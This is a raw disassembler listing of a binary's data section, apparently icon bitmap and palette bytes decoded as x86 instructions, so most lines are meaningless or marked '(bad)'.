  402050:	00 00                	add    %al,(%eax)
  402052:	ff 00                	incl   (%eax)
  402054:	00 fc                	add    %bh,%ah
  402056:	00 00                	add    %al,(%eax)
  402058:	00 00                	add    %al,(%eax)
  40205a:	ff 00                	incl   (%eax)
  40205c:	00 fc                	add    %bh,%ah
  40205e:	00 00                	add    %al,(%eax)
  402060:	00 00                	add    %al,(%eax)
  402062:	ff 00                	incl   (%eax)
  402064:	00 fc                	add    %bh,%ah
  402066:	00 00                	add    %al,(%eax)
  402068:	00 00                	add    %al,(%eax)
  40206a:	ff 00                	incl   (%eax)
  40206c:	00 f8                	add    %bh,%al
  40206e:	00 00                	add    %al,(%eax)
  402070:	00 00                	add    %al,(%eax)
  402072:	ff 00                	incl   (%eax)
  402074:	00 f8                	add    %bh,%al
  402076:	00 00                	add    %al,(%eax)
  402078:	00 00                	add    %al,(%eax)
  40207a:	ff 00                	incl   (%eax)
  40207c:	00 f8                	add    %bh,%al
  40207e:	00 00                	add    %al,(%eax)
  402080:	00 00                	add    %al,(%eax)
  402082:	ff 00                	incl   (%eax)
  402084:	00 f8                	add    %bh,%al
  402086:	00 00                	add    %al,(%eax)
  402088:	00 00                	add    %al,(%eax)
  40208a:	ff 00                	incl   (%eax)
  40208c:	00 f8                	add    %bh,%al
  40208e:	00 00                	add    %al,(%eax)
  402090:	00 00                	add    %al,(%eax)
  402092:	7f 00                	jg     0x402094
  402094:	00 f8                	add    %bh,%al
  402096:	00 00                	add    %al,(%eax)
  402098:	00 00                	add    %al,(%eax)
  40209a:	7f 00                	jg     0x40209c
  40209c:	00 f8                	add    %bh,%al
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	00 00                	add    %al,(%eax)
  4020a2:	7f 00                	jg     0x4020a4
  4020a4:	00 f8                	add    %bh,%al
  4020a6:	00 00                	add    %al,(%eax)
  4020a8:	00 00                	add    %al,(%eax)
  4020aa:	7f 00                	jg     0x4020ac
  4020ac:	00 f8                	add    %bh,%al
  4020ae:	00 00                	add    %al,(%eax)
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	7f 00                	jg     0x4020b4
  4020b4:	00 f8                	add    %bh,%al
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	00 00                	add    %al,(%eax)
  4020ba:	7f 00                	jg     0x4020bc
  4020bc:	00 f8                	add    %bh,%al
  4020be:	00 00                	add    %al,(%eax)
  4020c0:	00 00                	add    %al,(%eax)
  4020c2:	7f 00                	jg     0x4020c4
  4020c4:	00 f8                	add    %bh,%al
  4020c6:	00 00                	add    %al,(%eax)
  4020c8:	00 00                	add    %al,(%eax)
  4020ca:	7f 00                	jg     0x4020cc
  4020cc:	00 f8                	add    %bh,%al
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	00 00                	add    %al,(%eax)
  4020d2:	7f 00                	jg     0x4020d4
  4020d4:	00 f8                	add    %bh,%al
  4020d6:	00 00                	add    %al,(%eax)
  4020d8:	00 00                	add    %al,(%eax)
  4020da:	7f 00                	jg     0x4020dc
  4020dc:	00 fc                	add    %bh,%ah
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	00 00                	add    %al,(%eax)
  4020e2:	ff 00                	incl   (%eax)
  4020e4:	00 fc                	add    %bh,%ah
  4020e6:	00 06                	add    %al,(%esi)
  4020e8:	00 03                	add    %al,(%ebx)
  4020ea:	ff 00                	incl   (%eax)
  4020ec:	00 fe                	add    %bh,%dh
  4020ee:	00 0f                	add    %cl,(%edi)
  4020f0:	fc                   	cld
  4020f1:	07                   	pop    %es
  4020f2:	ff 00                	incl   (%eax)
  4020f4:	00 fe                	add    %bh,%dh
  4020f6:	00 1f                	add    %bl,(%edi)
  4020f8:	ff                   	(bad)
  4020f9:	ff                   	(bad)
  4020fa:	ff 00                	incl   (%eax)
  4020fc:	00 ff                	add    %bh,%bh
  4020fe:	e0 3f                	loopne 0x40213f
  402100:	ff                   	(bad)
  402101:	ff                   	(bad)
  402102:	ff 00                	incl   (%eax)
  402104:	00 ff                	add    %bh,%bh
  402106:	ff                   	(bad)
  402107:	ff                   	(bad)
  402108:	ff                   	(bad)
  402109:	ff                   	(bad)
  40210a:	ff 00                	incl   (%eax)
  40210c:	00 ff                	add    %bh,%bh
  40210e:	ff                   	(bad)
  40210f:	ff                   	(bad)
  402110:	ff                   	(bad)
  402111:	ff                   	(bad)
  402112:	ff 00                	incl   (%eax)
  402114:	00 ff                	add    %bh,%bh
  402116:	ff                   	(bad)
  402117:	ff                   	(bad)
  402118:	ff                   	(bad)
  402119:	ff                   	(bad)
  40211a:	ff 00                	incl   (%eax)
  40211c:	00 ff                	add    %bh,%bh
  40211e:	ff                   	(bad)
  40211f:	ff                   	(bad)
  402120:	ff                   	(bad)
  402121:	ff                   	(bad)
  402122:	ff 00                	incl   (%eax)
  402124:	00 ff                	add    %bh,%bh
  402126:	ff                   	(bad)
  402127:	ff                   	(bad)
  402128:	ff                   	(bad)
  402129:	ff                   	(bad)
  40212a:	ff 00                	incl   (%eax)
  40212c:	00 ff                	add    %bh,%bh
  40212e:	ff                   	(bad)
  40212f:	ff                   	(bad)
  402130:	ff                   	(bad)
  402131:	ff                   	(bad)
  402132:	ff 00                	incl   (%eax)
  402134:	00 ff                	add    %bh,%bh
  402136:	ff                   	(bad)
  402137:	ff                   	(bad)
  402138:	ff                   	(bad)
  402139:	ff                   	(bad)
  40213a:	ff 00                	incl   (%eax)
  40213c:	00 28                	add    %ch,(%eax)
  40213e:	00 00                	add    %al,(%eax)
  402140:	00 20                	add    %ah,(%eax)
  402142:	00 00                	add    %al,(%eax)
  402144:	00 40 00             	add    %al,0x0(%eax)
  402147:	00 00                	add    %al,(%eax)
  402149:	01 00                	add    %eax,(%eax)
  40214b:	08 00                	or     %al,(%eax)
  40214d:	00 00                	add    %al,(%eax)
  40214f:	00 00                	add    %al,(%eax)
  402151:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
	...
  40215d:	00 01                	add    %al,(%ecx)
	...
  402167:	00 00                	add    %al,(%eax)
  402169:	ff                   	(bad)
  40216a:	ff                   	(bad)
  40216b:	ff 00                	incl   (%eax)
  40216d:	08 94 cc 00 38 a4 d4 	or     %dl,-0x2b5bc800(%esp,%ecx,8)
  402174:	00 58 b0             	add    %bl,-0x50(%eax)
  402177:	d8 00                	fadds  (%eax)
  402179:	68 b8 d8 00 7c       	push   $0x7c00d8b8
  40217e:	c4                   	(bad)
  40217f:	e0 00                	loopne 0x402181
  402181:	90                   	nop
  402182:	cc                   	int3
  402183:	e4 00                	in     $0x0,%al
  402185:	60                   	pusha
  402186:	b8 dc 00 00 64       	mov    $0x640000dc,%eax
  40218b:	8c 00                	mov    %es,(%eax)
  40218d:	00 80 c0 00 78 c4    	add    %al,-0x3b87ff40(%eax)
  402193:	e0 00                	loopne 0x402195
  402195:	d0 f0                	shl    $1,%al
  402197:	f8                   	clc
  402198:	00 c4                	add    %al,%ah
  40219a:	f4                   	hlt
  40219b:	f8                   	clc
  40219c:	00 c8                	add    %cl,%al
  40219e:	f8                   	clc
  40219f:	fc                   	cld
  4021a0:	00 c8                	add    %cl,%al
  4021a2:	fc                   	cld
  4021a3:	fc                   	cld
  4021a4:	00 ec                	add    %ch,%ah
  4021a6:	fc                   	cld
  4021a7:	fc                   	cld
  4021a8:	00 50 a4             	add    %dl,-0x5c(%eax)
  4021ab:	c8 00 1c 94          	enter  $0x1c00,$0x94
  4021af:	c8 00 34 9c          	enter  $0x3400,$0x9c
  4021b3:	cc                   	int3
  4021b4:	00 44 a4 d0          	add    %al,-0x30(%esp,%eiz,4)
  4021b8:	00 50 b0             	add    %dl,-0x50(%eax)
  4021bb:	d8 00                	fadds  (%eax)
  4021bd:	3c ac                	cmp    $0xac,%al
  4021bf:	d8 00                	fadds  (%eax)
  4021c1:	04 74                	add    $0x74,%al
  4021c3:	a0 00 34 a8 d4       	mov    0xd4a83400,%al
  4021c8:	00 d4                	add    %dl,%ah
  4021ca:	f4                   	hlt
  4021cb:	f8                   	clc
  4021cc:	00 a4 fc fc 00 94 f8 	add    %ah,-0x76bff04(%esp,%edi,8)
  4021d3:	fc                   	cld
  4021d4:	00 90 f8 fc 00 88    	add    %dl,-0x77ff0308(%eax)
  4021da:	f8                   	clc
  4021db:	fc                   	cld
  4021dc:	00 ac f8 fc 00 d0 f0 	add    %ch,-0xf2fff04(%eax,%edi,8)
  4021e3:	fc                   	cld
  4021e4:	00 40 98             	add    %al,-0x68(%eax)
  4021e7:	c0 00 50             	rolb   $0x50,(%eax)
  4021ea:	b4 dc                	mov    $0xdc,%ah
  4021ec:	00 74 c0 e0          	add    %dh,-0x20(%eax,%eax,8)
  4021f0:	00 84 c8 e4 00 98 d0 	add    %al,-0x2f67ff1c(%eax,%ecx,8)
  4021f7:	e8 00 9c d8 ec       	call   0xed18bdfc
  4021fc:	00 a0 e0 f0 00 a8    	add    %ah,-0x57ff0f20(%eax)
  402202:	e4 f4                	in     $0xf4,%al
  402204:	00 ac f0 f8 00 b8 f8 	add    %ch,-0x747ff08(%eax,%esi,8)
  40220b:	fc                   	cld
  40220c:	00 88 e4 f8 00 00    	add    %cl,0xf8e4(%eax)
  402212:	70 a0                	jo     0x4021b4
  402214:	00 00                	add    %al,(%eax)
  402216:	68 a0 00 00 7c       	push   $0x7c0000a0
  40221b:	bc 00 98 d0 ec       	mov    $0xecd09800,%esp
  402220:	00 c4                	add    %al,%ah
  402222:	fc                   	cld
  402223:	fc                   	cld
  402224:	00 98 f8 fc 00 b4    	add    %bl,-0x4bff0308(%eax)
  40222a:	f8                   	clc
  40222b:	fc                   	cld
  40222c:	00 d8                	add    %bl,%al
  40222e:	fc                   	cld
  40222f:	fc                   	cld
  402230:	00 b0 ec f8 00 a0    	add    %dh,-0x5fff0714(%eax)
  402236:	e8 f4 00 94 e8       	call   0xe8d4232f
  40223b:	f4                   	hlt
  40223c:	00 84 e0 f0 00 6c d8 	add    %al,-0x2793ff10(%eax,%eiz,8)
  402243:	ec                   	in     (%dx),%al
  402244:	00 5c cc e8          	add    %bl,-0x18(%esp,%ecx,8)
  402248:	00 58 c4             	add    %bl,-0x3c(%eax)
  40224b:	e4 00                	in     $0x0,%al
  40224d:	4c                   	dec    %esp
  40224e:	bc e0 00 40 b0       	mov    $0xb04000e0,%esp
  402253:	d8 00                	fadds  (%eax)
  402255:	5c                   	pop    %esp
  402256:	bc e0 00 94 d0       	mov    $0xd09400e0,%esp
  40225b:	e8 00 1c 88 b4       	call   0xb4c83e60
  402260:	00 00                	add    %al,(%eax)
  402262:	8c c8                	mov    %cs,%eax
  402264:	00 b0 e0 f4 00 a8    	add    %dh,-0x57ff0b20(%eax)
  40226a:	f8                   	clc
  40226b:	fc                   	cld
  40226c:	00 94 fc fc 00 a0 fc 	add    %dl,-0x35fff04(%esp,%edi,8)
  402273:	fc                   	cld
  402274:	00 68 dc             	add    %ch,-0x24(%eax)
  402277:	f0 00 34 b4          	lock add %dh,(%esp,%esi,4)
  40227b:	dc 00                	faddl  (%eax)
  40227d:	58                   	pop    %eax
  40227e:	c0 e0 00             	shl    $0x0,%al
  402281:	64 c0 e0 00          	fs shl $0x0,%al
  402285:	70 c0                	jo     0x402247
  402287:	e0 00                	loopne 0x402289
  402289:	8c cc                	mov    %cs,%esp
  40228b:	e4 00                	in     $0x0,%al
  40228d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40228e:	d8 ec                	fsubr  %st(4),%st
  402290:	00 c4                	add    %al,%ah
  402292:	e4 f4                	in     $0xf4,%al
  402294:	00 e0                	add    %ah,%al
  402296:	f0 f8                	lock clc
  402298:	00 fc                	add    %bh,%ah
  40229a:	fc                   	cld
  40229b:	fc                   	cld
  40229c:	00 e8                	add    %ch,%al
  40229e:	f8                   	clc
  40229f:	fc                   	cld
  4022a0:	00 cc                	add    %cl,%ah
  4022a2:	ec                   	in     (%dx),%al
  4022a3:	fc                   	cld
  4022a4:	00 f4                	add    %dh,%ah
  4022a6:	fc                   	cld
  4022a7:	fc                   	cld
  4022a8:	00 10                	add    %dl,(%eax)
  4022aa:	74 9c                	je     0x402248
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	88 c4                	mov    %al,%ah
  4022b0:	00 a8 dc f0 00 a4    	add    %ch,-0x5bff0f24(%eax)
  4022b6:	f8                   	clc
  4022b7:	fc                   	cld
  4022b8:	00 9c fc fc 00 30 a8 	add    %bl,-0x57cfff04(%esp,%edi,8)
  4022bf:	d4 00                	aam    $0x0
  4022c1:	cc                   	int3
  4022c2:	e4 f4                	in     $0xf4,%al
  4022c4:	00 e4                	add    %ah,%ah
  4022c6:	f8                   	clc
  4022c7:	fc                   	cld
  4022c8:	00 e8                	add    %ch,%al
  4022ca:	fc                   	cld
  4022cb:	fc                   	cld
  4022cc:	00 e0                	add    %ah,%al
  4022ce:	fc                   	cld
  4022cf:	fc                   	cld
  4022d0:	00 c0                	add    %al,%al
  4022d2:	f0 fc                	lock cld
  4022d4:	00 a0 dc fc 00 d8    	add    %ah,-0x27ff0324(%eax)
  4022da:	f8                   	clc
  4022db:	fc                   	cld
  4022dc:	00 00                	add    %al,(%eax)
  4022de:	5c                   	pop    %esp
  4022df:	84 00                	test   %al,(%eax)
  4022e1:	00 80 bc 00 a8 dc    	add    %al,-0x2357ff44(%eax)
  4022e7:	f4                   	hlt
  4022e8:	00 9c f4 fc 00 88 ec 	add    %bl,-0x1377ff04(%esp,%esi,8)
  4022ef:	fc                   	cld
  4022f0:	00 74 e4 f8          	add    %dh,-0x8(%esp,%eiz,8)
  4022f4:	00 68 d8             	add    %ch,-0x28(%eax)
  4022f7:	f0 00 50 c8          	lock add %dl,-0x38(%eax)
  4022fb:	e8 00 40 bc e0       	call   0xe0fc6300
  402300:	00 c8                	add    %cl,%al
  402302:	e8 f4 00 e4 fc       	call   0xfd2423fb
  402307:	fc                   	cld
  402308:	00 cc                	add    %cl,%ah
  40230a:	fc                   	cld
  40230b:	fc                   	cld
  40230c:	00 d0                	add    %dl,%al
  40230e:	fc                   	cld
  40230f:	fc                   	cld
  402310:	00 cc                	add    %cl,%ah
  402312:	f8                   	clc
  402313:	fc                   	cld
  402314:	00 d4                	add    %dl,%ah
  402316:	fc                   	cld
  402317:	fc                   	cld
  402318:	00 b8 f0 fc 00 a4    	add    %bh,-0x5bff0310(%eax)
  40231e:	e0 fc                	loopne 0x40231c
  402320:	00 b4 e8 f4 00 00 4c 	add    %dh,0x4c0000f4(%eax,%ebp,8)
  402327:	70 00                	jo     0x402329
  402329:	00 84 bc 00 90 d4 f0 	add    %al,-0xf2b7000(%esp,%edi,4)
  402330:	00 7c d8 f4          	add    %bh,-0xc(%eax,%ebx,8)
  402334:	00 30                	add    %dh,(%eax)
  402336:	ac                   	lods   %ds:(%esi),%al
  402337:	d8 00                	fadds  (%eax)
  402339:	50                   	push   %eax
  40233a:	b0 dc                	mov    $0xdc,%al
  40233c:	00 74 c0 e4          	add    %dh,-0x1c(%eax,%eax,8)
  402340:	00 8c cc e8 00 ac dc 	add    %cl,-0x2353ff18(%esp,%ecx,8)
  402347:	f0 00 dc             	lock add %bl,%ah
  40234a:	f4                   	hlt
  40234b:	fc                   	cld
  40234c:	00 bc fc fc 00 c0 fc 	add    %bh,-0x33fff04(%esp,%edi,8)
  402353:	fc                   	cld
  402354:	00 ac f0 fc 00 a0 e0 	add    %ch,-0x1f5fff04(%eax,%esi,8)
  40235b:	fc                   	cld
  40235c:	00 94 d4 e8 00 00 3c 	add    %dl,0x3c0000e8(%esp,%edx,8)
  402363:	5c                   	pop    %esp
  402364:	00 00                	add    %al,(%eax)
  402366:	80 b8 00 88 cc ec 00 	cmpb   $0x0,-0x13337800(%eax)
  40236d:	40                   	inc    %eax
  40236e:	b0 dc                	mov    $0xdc,%al
  402370:	00 9c d4 ec 00 b4 fc 	add    %bl,-0x34bff14(%esp,%edx,8)
  402377:	fc                   	cld
  402378:	00 b8 fc fc 00 a0    	add    %bh,-0x5fff0304(%eax)
  40237e:	f0 fc                	lock cld
  402380:	00 a0 e4 fc 00 74    	add    %ah,0x7400fce4(%eax)
  402386:	c4                   	(bad)
  402387:	dc 00                	faddl  (%eax)
  402389:	00 30                	add    %dh,(%eax)
  40238b:	48                   	dec    %eax
  40238c:	00 7c c8 ec          	add    %bh,-0x14(%eax,%ecx,8)
  402390:	00 58 b8             	add    %bl,-0x48(%eax)
  402393:	e4 00                	in     $0x0,%al
  402395:	c0 ec f8             	shr    $0xf8,%ah
  402398:	00 a0 f8 fc 00 a8    	add    %ah,-0x57ff0308(%eax)
  40239e:	fc                   	cld
  40239f:	fc                   	cld
  4023a0:	00 94 f0 fc 00 9c e4 	add    %dl,-0x1b63ff04(%eax,%esi,8)
  4023a7:	fc                   	cld
  4023a8:	00 54 b0 d0          	add    %dl,-0x30(%eax,%esi,4)
  4023ac:	00 00                	add    %al,(%eax)
  4023ae:	14 24                	adc    $0x24,%al
  4023b0:	00 60 bc             	add    %ah,-0x44(%eax)
  4023b3:	e4 00                	in     $0x0,%al
  4023b5:	50                   	push   %eax
  4023b6:	b4 e0                	mov    $0xe0,%ah
  4023b8:	00 a8 e8 f8 00 98    	add    %ch,-0x67ff0718(%eax)
  4023be:	fc                   	cld
  4023bf:	fc                   	cld
  4023c0:	00 98 e4 fc 00 34    	add    %bl,0x3400fce4(%eax)
  4023c6:	a0 c0 00 4c b0       	mov    0xb04c00c0,%al
  4023cb:	e0 00                	loopne 0x4023cd
  4023cd:	54                   	push   %esp
  4023ce:	b4 e0                	mov    $0xe0,%ah
  4023d0:	00 84 dc fc 00 28 90 	add    %al,-0x6fd7ff04(%esp,%ebx,8)
  4023d7:	b0 00                	mov    $0x0,%al
  4023d9:	48                   	dec    %eax
  4023da:	b0 e0                	mov    $0xe0,%al
  4023dc:	00 64 bc e4          	add    %ah,-0x1c(%esp,%edi,4)
  4023e0:	00 ac ec fc 00 90 f4 	add    %ch,-0xb6fff04(%esp,%ebp,8)
  4023e7:	fc                   	cld
  4023e8:	00 90 f0 fc 00 94    	add    %dl,-0x6bff0310(%eax)
  4023ee:	f4                   	hlt
  4023ef:	fc                   	cld
  4023f0:	00 8c ec fc 00 70 d0 	add    %cl,-0x2f8fff04(%esp,%ebp,8)
  4023f7:	fc                   	cld
  4023f8:	00 1c 7c             	add    %bl,(%esp,%edi,2)
  4023fb:	98                   	cwtl
  4023fc:	00 24 a0             	add    %ah,(%eax,%eiz,4)
  4023ff:	d4 00                	aam    $0x0
  402401:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402402:	ec                   	in     (%dx),%al
  402403:	fc                   	cld
  402404:	00 88 f0 fc 00 8c    	add    %cl,-0x73ff0310(%eax)
  40240a:	f0 fc                	lock cld
  40240c:	00 58 c8             	add    %bl,-0x38(%eax)
  40240f:	f8                   	clc
  402410:	00 10                	add    %dl,(%eax)
  402412:	64 80 00 18          	addb   $0x18,%fs:(%eax)
  402416:	9c                   	pushf
  402417:	d0 00                	rolb   $1,(%eax)
  402419:	84 e8                	test   %ch,%al
  40241b:	fc                   	cld
  40241c:	00 88 e8 fc 00 48    	add    %cl,0x4800fce8(%eax)
  402422:	bc f0 00 04 50       	mov    $0x500400f0,%esp
  402427:	68 00 14 9c d4       	push   $0xd49c1400
  40242c:	00 9c e8 fc 00 80 e4 	add    %bl,-0x1b7fff04(%eax,%ebp,8)
  402433:	fc                   	cld
  402434:	00 84 e4 fc 00 88 e4 	add    %al,-0x1b77ff04(%esp,%eiz,8)
  40243b:	fc                   	cld
  40243c:	00 38                	add    %bh,(%eax)
  40243e:	b0 ec                	mov    $0xec,%al
  402440:	00 00                	add    %al,(%eax)
  402442:	30 44 00 58          	xor    %al,0x58(%eax,%eax,1)
  402446:	b8 e0 00 78 e0       	mov    $0xe07800e0,%eax
  40244b:	fc                   	cld
  40244c:	00 80 e0 fc 00 7c    	add    %al,0x7c00fce0(%eax)
  402452:	e0 fc                	loopne 0x402450
  402454:	00 30                	add    %dh,(%eax)
  402456:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402457:	dc 00                	faddl  (%eax)
  402459:	00 24 34             	add    %ah,(%esp,%esi,1)
  40245c:	00 00                	add    %al,(%eax)
  40245e:	84 c4                	test   %al,%ah
  402460:	00 68 c0             	add    %ch,-0x40(%eax)
  402463:	e4 00                	in     $0x0,%al
  402465:	98                   	cwtl
  402466:	e8 fc 00 74 d8       	call   0xd8b42567
  40246b:	fc                   	cld
  40246c:	00 78 dc             	add    %bh,-0x24(%eax)
  40246f:	fc                   	cld
  402470:	00 7c dc fc          	add    %bh,-0x4(%esp,%ebx,8)
  402474:	00 70 d8             	add    %dh,-0x28(%eax)
  402477:	fc                   	cld
  402478:	00 5c d0 f8          	add    %bl,-0x8(%eax,%edx,8)
  40247c:	00 18                	add    %bl,(%eax)
  40247e:	94                   	xchg   %eax,%esp
  40247f:	c8 00 00 1c          	enter  $0x0,$0x1c
  402483:	28 00                	sub    %al,(%eax)
  402485:	64 c0 e4 00          	fs shl $0x0,%ah
  402489:	90                   	nop
  40248a:	e0 fc                	loopne 0x402488
  40248c:	00 70 d4             	add    %dh,-0x2c(%eax)
  40248f:	fc                   	cld
  402490:	00 74 d4 fc          	add    %dh,-0x4(%esp,%edx,8)
  402494:	00 78 d8             	add    %bh,-0x28(%eax)
  402497:	fc                   	cld
  402498:	00 80 dc fc 00 68    	add    %al,0x6800fcdc(%eax)
  40249e:	d8 fc                	fdivr  %st(4),%st
  4024a0:	00 54 c8 f4          	add    %dl,-0xc(%eax,%ecx,8)
  4024a4:	00 3c b0             	add    %bh,(%eax,%esi,4)
  4024a7:	e0 00                	loopne 0x4024a9
  4024a9:	20 9c cc 00 14 80 a8 	and    %bl,-0x577fec00(%esp,%ecx,8)
  4024b0:	00 00                	add    %al,(%eax)
  4024b2:	60                   	pusha
  4024b3:	84 00                	test   %al,(%eax)
  4024b5:	00 34 48             	add    %dh,(%eax,%ecx,2)
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	08 08                	or     %cl,(%eax)
  4024bc:	00 00                	add    %al,(%eax)
  4024be:	88 c0                	mov    %al,%al
  4024c0:	00 70 c4             	add    %dh,-0x3c(%eax)
  4024c3:	e8 00 88 dc fc       	call   0xfd1cacc8
  4024c8:	00 68 d0             	add    %ch,-0x30(%eax)
  4024cb:	fc                   	cld
  4024cc:	00 74 d0 fc          	add    %dh,-0x4(%eax,%edx,8)
  4024d0:	00 5c cc f8          	add    %bl,-0x8(%esp,%ecx,8)
  4024d4:	00 48 c0             	add    %cl,-0x40(%eax)
  4024d7:	f0 00 34 b0          	lock add %dh,(%eax,%esi,4)
  4024db:	e0 00                	loopne 0x4024dd
  4024dd:	1c 90                	sbb    $0x90,%al
  4024df:	bc 00 08 6c 98       	mov    $0x986c0800,%esp
  4024e4:	00 00                	add    %al,(%eax)
  4024e6:	54                   	push   %esp
  4024e7:	78 00                	js     0x4024e9
  4024e9:	00 0c 18             	add    %cl,(%eax,%ebx,1)
  4024ec:	00 00                	add    %al,(%eax)
  4024ee:	8c c4                	mov    %es,%esp
  4024f0:	00 74 c8 ec          	add    %dh,-0x14(%eax,%ecx,8)
  4024f4:	00 84 d8 fc 00 64 d0 	add    %al,-0x2f9bff04(%eax,%ebx,8)
  4024fb:	fc                   	cld
  4024fc:	00 5c cc fc          	add    %bl,-0x4(%esp,%ecx,8)
  402500:	00 40 b4             	add    %al,-0x4c(%eax)
  402503:	e8 00 28 a0 d0       	call   0xd0e04d08
  402508:	00 14 8c             	add    %dl,(%esp,%ecx,4)
  40250b:	bc 00 08 6c 94       	mov    $0x946c0800,%esp
  402510:	00 00                	add    %al,(%eax)
  402512:	44                   	inc    %esp
  402513:	64 00 00             	add    %al,%fs:(%eax)
  402516:	24 38                	and    $0x38,%al
  402518:	00 00                	add    %al,(%eax)
  40251a:	14 1c                	adc    $0x1c,%al
  40251c:	00 5c c0 ec          	add    %bl,-0x14(%eax,%eax,8)
  402520:	00 58 c4             	add    %bl,-0x3c(%eax)
  402523:	f4                   	hlt
  402524:	00 34 b4             	add    %dh,(%esp,%esi,4)
  402527:	ec                   	in     (%dx),%al
  402528:	00 24 98             	add    %ah,(%eax,%ebx,4)
  40252b:	cc                   	int3
  40252c:	00 0c 7c             	add    %cl,(%esp,%edi,2)
  40252f:	a8 00                	test   $0x0,%al
  402531:	00 5c 80 00          	add    %bl,0x0(%eax,%eax,4)
  402535:	00 44 60 00          	add    %al,0x0(%eax,%eiz,2)
  402539:	00 20                	add    %ah,(%eax)
  40253b:	30 00                	xor    %al,(%eax)
  40253d:	0c 80                	or     $0x80,%al
  40253f:	ac                   	lods   %ds:(%esi),%al
  402540:	00 04 58             	add    %al,(%eax,%ebx,2)
  402543:	7c 00                	jl     0x402545
  402545:	00 08                	add    %cl,(%eax)
  402547:	0c 00                	or     $0x0,%al
  402549:	38 a6 d4 00 68 b8    	cmp    %ah,-0x4797ff2c(%esi)
  40254f:	da 00                	fiaddl (%eax)
  402551:	90                   	nop
  402552:	cc                   	int3
  402553:	e6 00                	out    %al,$0x0
  402555:	00 64 8e 00          	add    %ah,0x0(%esi,%ecx,4)
  402559:	78 c4                	js     0x40251f
  40255b:	e2 00                	loop   0x40255d
  40255d:	c6                   	(bad)
  40255e:	f4                   	hlt
  40255f:	fa                   	cli
  402560:	00 ca                	add    %cl,%dl
  402562:	fa                   	cli
  402563:	fc                   	cld
	...
  4025e8:	00 00                	add    %al,(%eax)
  4025ea:	f6 f7                	div    %bh
  4025ec:	89 c7                	mov    %eax,%edi
  4025ee:	f8                   	clc
	...
  402607:	00 00                	add    %al,(%eax)
  402609:	d6                   	salc
  40260a:	ee                   	out    %al,(%dx)
  40260b:	aa                   	stos   %al,%es:(%edi)
  40260c:	f0 f1                	lock int1
  40260e:	f2 5e                	repnz pop %esi
  402610:	f4                   	hlt
  402611:	bd 00 00 00 00       	mov    $0x0,%ebp
	...
  402626:	00 00                	add    %al,(%eax)
  402628:	00 e2                	add    %ah,%dl
  40262a:	e3 9b                	jecxz  0x4025c7
  40262c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40262d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40262e:	d9 e6                	(bad)
  402630:	e7 e8                	out    %eax,$0xe8
  402632:	e9 ea eb ec ed       	jmp    0xee2d1221
	...
  402647:	00 00                	add    %al,(%eax)
  402649:	52                   	push   %edx
  40264a:	d7                   	xlat   %ds:(%ebx)
  40264b:	d8 d9                	fcomp  %st(1)
  40264d:	ca cb cb             	lret   $0xcbcb
  402650:	cc                   	int3
  402651:	c2 c4 e6             	ret    $0xe6c4
  402654:	dc dd                	(bad)
  402656:	de df                	(bad)
  402658:	e0 d4                	loopne 0x40262e
  40265a:	e1 00                	loope  0x40265c
	...
  402668:	00 71 bf             	add    %dh,-0x41(%ecx)
  40266b:	c9                   	leave
  40266c:	ca cc c1             	lret   $0xc1cc
  40266f:	c1 c1 c1             	rol    $0xc1,%ecx
  402672:	cc                   	int3
  402673:	c3                   	ret
  402674:	cd c3                	int    $0xc3
  402676:	c1 ce aa             	ror    $0xaa,%esi
  402679:	d0 d1                	rcl    $1,%cl
  40267b:	d2 d3                	rcl    %cl,%bl
  40267d:	d4 d5                	aam    $0xd5
	...
  402687:	00 00                	add    %al,(%eax)
  402689:	52                   	push   %edx
  40268a:	bf b2 c1 c3 c3       	mov    $0xc3c3c1b2,%edi
  40268f:	c3                   	ret
  402690:	c3                   	ret
  402691:	c3                   	ret
  402692:	c3                   	ret
  402693:	c3                   	ret
  402694:	c2 c3 c3             	ret    $0xc3c3
  402697:	ba ba b3 b3 c1       	mov    $0xc1b3b3ba,%edx
  40269c:	c5 c6 c7             	(bad)
	...
  4026a7:	00 00                	add    %al,(%eax)
  4026a9:	3f                   	aas
  4026aa:	b8 b2 bb ba b3       	mov    $0xb3babbb2,%eax
  4026af:	b3 b3                	mov    $0xb3,%bl
  4026b1:	b3 b3                	mov    $0xb3,%bl
  4026b3:	b3 b3                	mov    $0xb3,%bl
  4026b5:	b3 b3                	mov    $0xb3,%bl
  4026b7:	b3 b3                	mov    $0xb3,%bl
  4026b9:	b3 ba                	mov    $0xba,%bl
  4026bb:	b3 ae                	mov    $0xae,%bl
  4026bd:	bc bd 00 00 00       	mov    $0xbd,%esp
  4026c2:	00 00                	add    %al,(%eax)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 00                	add    %al,(%eax)
  4026c8:	00 b1 93 b2 b3 b4    	add    %dh,-0x4b4c4d6d(%ecx)
  4026ce:	ad                   	lods   %ds:(%esi),%eax
  4026cf:	ad                   	lods   %ds:(%esi),%eax
  4026d0:	ad                   	lods   %ds:(%esi),%eax
  4026d1:	ad                   	lods   %ds:(%esi),%eax
  4026d2:	ad                   	lods   %ds:(%esi),%eax
  4026d3:	ad                   	lods   %ds:(%esi),%eax
  4026d4:	ad                   	lods   %ds:(%esi),%eax
  4026d5:	ad                   	lods   %ds:(%esi),%eax
  4026d6:	ad                   	lods   %ds:(%esi),%eax
  4026d7:	ad                   	lods   %ds:(%esi),%eax
  4026d8:	ad                   	lods   %ds:(%esi),%eax
  4026d9:	ad                   	lods   %ds:(%esi),%eax
  4026da:	ad                   	lods   %ds:(%esi),%eax
  4026db:	b3 ae                	mov    $0xae,%bl
  4026dd:	b6 89                	mov    $0x89,%dh
	...
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	ac                   	lods   %ds:(%esi),%al
  4026ea:	c8 7c ad 62          	enter  $0xad7c,$0x62
  4026ee:	62 62 62             	bound  %esp,0x62(%edx)
  4026f1:	62 62 62             	bound  %esp,0x62(%edx)
  4026f4:	62 62 62             	bound  %esp,0x62(%edx)
  4026f7:	62 62 62             	bound  %esp,0x62(%edx)
